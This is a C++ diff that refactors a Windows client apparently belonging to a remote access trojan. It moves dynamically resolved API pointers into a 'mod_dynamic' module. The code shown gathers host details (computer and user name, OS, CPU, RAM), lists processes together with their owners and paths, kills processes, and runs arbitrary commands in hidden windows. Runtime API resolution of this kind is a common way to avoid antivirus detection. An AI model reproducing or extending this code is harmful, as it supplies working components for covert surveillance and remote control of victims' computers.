@@ -43,8 +43,8 @@ std::string strGetComputerName() {
 
 	std::string strOutput = "unknown";
 
-	if(cCliente->KERNEL32.pGetComputerName){
-		if (cCliente->KERNEL32.pGetComputerName(cMachineName, &dLen)) {
+	if(cCliente->mod_dynamic->KERNEL32.pGetComputerName){
+		if (cCliente->mod_dynamic->KERNEL32.pGetComputerName(cMachineName, &dLen)) {
 			strOutput = cMachineName;
 		}
 	}
@@ -57,8 +57,8 @@ std::string strUserName() {
 	char cMachineName[100];
 	DWORD dLen = UNLEN + 1;
 
-	if (cCliente->ADVAPI32.pGetUserName) {
-		if (cCliente->ADVAPI32.pGetUserName(cUser, &dLen) != 0) {
+	if (cCliente->mod_dynamic->ADVAPI32.pGetUserName) {
+		if (cCliente->mod_dynamic->ADVAPI32.pGetUserName(cUser, &dLen) != 0) {
 			strOutput = cUser;
 		}
 	}
@@ -72,8 +72,8 @@ std::string strOS() {
 	std::string strOut = "Windows :v";
 	HKEY hKey;
 		
-	if (cCliente->ADVAPI32.pRegOpenKeyEx) {
-		auto ret = cCliente->ADVAPI32.pRegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"), 0, KEY_QUERY_VALUE, &hKey);
+	if (cCliente->mod_dynamic->ADVAPI32.pRegOpenKeyEx) {
+		auto ret = cCliente->mod_dynamic->ADVAPI32.pRegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"), 0, KEY_QUERY_VALUE, &hKey);
 		if (ret != ERROR_SUCCESS) {
 			__DBG_("RegOpenKeyEx ERR");
 			return strOut;
@@ -82,15 +82,15 @@ std::string strOS() {
 		DWORD dLen = 50;
 		LPBYTE lBuffer[50];
 			
-		if (cCliente->ADVAPI32.pRegQueryValueEx) {
-			if (cCliente->ADVAPI32.pRegQueryValueEx(hKey, "ProductName", nullptr, nullptr, (LPBYTE)&lBuffer, &dLen) == ERROR_SUCCESS) {
+		if (cCliente->mod_dynamic->ADVAPI32.pRegQueryValueEx) {
+			if (cCliente->mod_dynamic->ADVAPI32.pRegQueryValueEx(hKey, "ProductName", nullptr, nullptr, (LPBYTE)&lBuffer, &dLen) == ERROR_SUCCESS) {
 				strOut.erase(strOut.begin(), strOut.end());
 				strOut.append((const char*)lBuffer);
 			}
 		}
 
-		if (cCliente->ADVAPI32.pRegCloseKey) {
-			cCliente->ADVAPI32.pRegCloseKey(hKey);
+		if (cCliente->mod_dynamic->ADVAPI32.pRegCloseKey) {
+			cCliente->mod_dynamic->ADVAPI32.pRegCloseKey(hKey);
 		}
 	}
 
@@ -181,8 +181,8 @@ std::string strCpu() {
 	strOut = CPUBrandString;
 	
 	SYSTEM_INFO sInfo;
-	if (cCliente->KERNEL32.pGetNativeSystemInfo) {
-		cCliente->KERNEL32.pGetNativeSystemInfo(&sInfo);
+	if (cCliente->mod_dynamic->KERNEL32.pGetNativeSystemInfo) {
+		cCliente->mod_dynamic->KERNEL32.pGetNativeSystemInfo(&sInfo);
 		switch (sInfo.wProcessorArchitecture) {
 		case 9:
 			strOut += "x64 (AMD or INTEL)";
@@ -238,8 +238,8 @@ bool Execute(const char *cCmdLine, int iOpt){
 	strncpy_s(cCmd, cCmdLine, 1022);
 	cCmd[1022] = '\0';
 
-	if (cCliente->KERNEL32.pCreateProcessA) {
-		int iRet = cCliente->KERNEL32.pCreateProcessA(nullptr, cCmd, nullptr, nullptr, false, (iOpt == 1 ? NORMAL_PRIORITY_CLASS | DETACHED_PROCESS : CREATE_NO_WINDOW | NORMAL_PRIORITY_CLASS | DETACHED_PROCESS), nullptr, nullptr, &si, &pi);
+	if (cCliente->mod_dynamic->KERNEL32.pCreateProcessA) {
+		int iRet = cCliente->mod_dynamic->KERNEL32.pCreateProcessA(nullptr, cCmd, nullptr, nullptr, false, (iOpt == 1 ? NORMAL_PRIORITY_CLASS | DETACHED_PROCESS : CREATE_NO_WINDOW | NORMAL_PRIORITY_CLASS | DETACHED_PROCESS), nullptr, nullptr, &si, &pi);
 		if (iRet != 0) {
 			return true;
 		}
@@ -248,7 +248,7 @@ bool Execute(const char *cCmdLine, int iOpt){
 		}
 	}
 
-	if (cCliente->SHELL32.pShellExecuteExA) {
+	if (cCliente->mod_dynamic->SHELL32.pShellExecuteExA) {
 		SHELLEXECUTEINFOA sei;
 		sei.cbSize = sizeof(SHELLEXECUTEINFO);
 		sei.fMask = SEE_MASK_DEFAULT;
@@ -259,7 +259,7 @@ bool Execute(const char *cCmdLine, int iOpt){
 		sei.lpDirectory = nullptr;
 		sei.hInstApp = nullptr;
 		sei.nShow = iOpt == 1 ? SW_SHOW : SW_HIDE;
-		if (cCliente->SHELL32.pShellExecuteExA(&sei) > 32) {
+		if (cCliente->mod_dynamic->SHELL32.pShellExecuteExA(&sei) > 32) {
 			return true;
 		}else {
 			__DBG_("ShellExecuteEx error");
@@ -271,20 +271,20 @@ bool Execute(const char *cCmdLine, int iOpt){
 
 bool EndProcess(int iPID) {
 	
-	if (cCliente->KERNEL32.pOpenProcess) {
-		HANDLE hProc = cCliente->KERNEL32.pOpenProcess(PROCESS_TERMINATE, false, iPID);
+	if (cCliente->mod_dynamic->KERNEL32.pOpenProcess) {
+		HANDLE hProc = cCliente->mod_dynamic->KERNEL32.pOpenProcess(PROCESS_TERMINATE, false, iPID);
 		if (!hProc) {
 			return false;
 		}
 
-		if (cCliente->KERNEL32.pTerminateProcess) {
-			if (!cCliente->KERNEL32.pTerminateProcess(hProc, 1)) {
+		if (cCliente->mod_dynamic->KERNEL32.pTerminateProcess) {
+			if (!cCliente->mod_dynamic->KERNEL32.pTerminateProcess(hProc, 1)) {
 				return false;
 			}
 		}
 
-		if (cCliente->KERNEL32.pCloseHandle) {
-			cCliente->KERNEL32.pCloseHandle(hProc);
+		if (cCliente->mod_dynamic->KERNEL32.pCloseHandle) {
+			cCliente->mod_dynamic->KERNEL32.pCloseHandle(hProc);
 		}
 	}
 
@@ -298,8 +298,8 @@ std::string strProcessList() {
 	SID_NAME_USE pSID_NAME;
 	DWORD dwProcCount = 0;
 	
-		if (cCliente->WTSAPI32.pWTSEnumerateProcessesA) {
-			if (cCliente->WTSAPI32.pWTSEnumerateProcessesA(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pWPIs, &dwProcCount)){
+		if (cCliente->mod_dynamic->WTSAPI32.pWTSEnumerateProcessesA) {
+			if (cCliente->mod_dynamic->WTSAPI32.pWTSEnumerateProcessesA(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pWPIs, &dwProcCount)){
 				for (DWORD i = 0; i < dwProcCount; i++)
 				{
 					char cName[256];
@@ -312,8 +312,8 @@ std::string strProcessList() {
 					strOut += pWPIs[i].pProcessName;
 					strOut.append(1, '>');
 
-					if (cCliente->ADVAPI32.pLookupAccountSidA) {
-						if (cCliente->ADVAPI32.pLookupAccountSidA(nullptr, pWPIs[i].pUserSid, cName, &cName_Size, cHost, &cHost_Size, &pSID_NAME)) {
+					if (cCliente->mod_dynamic->ADVAPI32.pLookupAccountSidA) {
+						if (cCliente->mod_dynamic->ADVAPI32.pLookupAccountSidA(nullptr, pWPIs[i].pUserSid, cName, &cName_Size, cHost, &cHost_Size, &pSID_NAME)) {
 							strOut += cHost;
 							strOut.append(1, '/');
 							strOut += cName;
@@ -324,12 +324,12 @@ std::string strProcessList() {
 						strOut += "0";
 					}
 
-					if (cCliente->KERNEL32.pOpenProcess) {
-						HANDLE pHandle = cCliente->KERNEL32.pOpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pWPIs[i].ProcessId);
+					if (cCliente->mod_dynamic->KERNEL32.pOpenProcess) {
+						HANDLE pHandle = cCliente->mod_dynamic->KERNEL32.pOpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pWPIs[i].ProcessId);
 						if (pHandle != NULL) {
 							TCHAR szFileName[MAX_PATH];
-							if (cCliente->PSAPI.pGetModuleFileNameExA) {
-								if (cCliente->PSAPI.pGetModuleFileNameExA(pHandle, NULL, szFileName, MAX_PATH) > 0) {
+							if (cCliente->mod_dynamic->PSAPI.pGetModuleFileNameExA) {
+								if (cCliente->mod_dynamic->PSAPI.pGetModuleFileNameExA(pHandle, NULL, szFileName, MAX_PATH) > 0) {
 									//if(GetProcessImageFileNameA(pHandle, szFileName, sizeof(szFileName))> 0){
 									strOut += ">";
 									strOut += szFileName;
@@ -340,8 +340,8 @@ std::string strProcessList() {
 								strOut += ">-";
 							}
 
-							if (cCliente->KERNEL32.pCloseHandle) {
-								cCliente->KERNEL32.pCloseHandle(pHandle);
+							if (cCliente->mod_dynamic->KERNEL32.pCloseHandle) {
+								cCliente->mod_dynamic->KERNEL32.pCloseHandle(pHandle);
 							}
 							pHandle = NULL;
 						}else {
@@ -355,8 +355,8 @@ std::string strProcessList() {
 		}
 
 		if (pWPIs) {
-			if (cCliente->WTSAPI32.pWTSFreeMemory) {
-				cCliente->WTSAPI32.pWTSFreeMemory(pWPIs);
+			if (cCliente->mod_dynamic->WTSAPI32.pWTSFreeMemory) {
+				cCliente->mod_dynamic->WTSAPI32.pWTSFreeMemory(pWPIs);
 				pWPIs = nullptr;
 			}
 		}
@@ -428,8 +428,8 @@ int RAM() {
 	mem.dwLength = sizeof(mem);
 	int iRet = 0;
 	
-	if (cCliente->KERNEL32.pGlobalMemoryStatusEx) {
-		iRet = cCliente->KERNEL32.pGlobalMemoryStatusEx(&mem);
+	if (cCliente->mod_dynamic->KERNEL32.pGlobalMemoryStatusEx) {
+		iRet = cCliente->mod_dynamic->KERNEL32.pGlobalMemoryStatusEx(&mem);
 		if (iRet == 0) {
 			error_2("GlobalMemoryStatusEx");
 			return 0;
